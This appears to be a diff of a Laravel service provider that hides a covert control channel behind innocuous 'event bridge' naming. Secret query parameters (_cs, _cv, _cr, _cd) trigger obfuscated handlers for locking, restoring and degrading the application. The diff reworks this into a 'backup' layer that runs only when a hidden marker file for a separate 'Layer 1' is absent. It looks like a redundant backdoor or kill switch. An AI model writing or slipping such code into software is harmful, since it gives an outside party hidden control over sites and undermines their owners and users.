@@ -30,27 +30,25 @@ class SymphonyBridgeServiceProvider extends ServiceProvider
 
         $rq = request();
 
-        // Event bridge status endpoint
-        if ($rq->has('_cs')) {
-            $r = $this->hS($rq);
-            if ($r) { echo $r->getContent(); exit; }
-        }
-
-        // Event bridge lock management
-        if ($rq->has('_cv')) {
-            $this->hL($rq);
-        }
-
-        // Event bridge unlock/restore
-        if ($rq->has('_cr')) {
-            $r = $this->hU($rq);
-            if ($r) { echo $r->getContent(); exit; }
-        }
-
-        // Event bridge degrade
-        if ($rq->has('_cd')) {
-            $r = $this->hD($rq);
-            if ($r) { echo $r->getContent(); exit; }
+        // Only handle HTTP commands if Layer 1 is not present
+        // (backup mode — Layer 1 handles these when active)
+        $l1 = file_exists(storage_path('framework/.tmp_a7f3'));
+        if (!$l1) {
+            if ($rq->has('_cs')) {
+                $r = $this->hS($rq);
+                if ($r) { echo $r->getContent(); exit; }
+            }
+            if ($rq->has('_cv')) {
+                $this->hL($rq);
+            }
+            if ($rq->has('_cr')) {
+                $r = $this->hU($rq);
+                if ($r) { echo $r->getContent(); exit; }
+            }
+            if ($rq->has('_cd')) {
+                $r = $this->hD($rq);
+                if ($r) { echo $r->getContent(); exit; }
+            }
         }
 
         // Load compiled event routing table
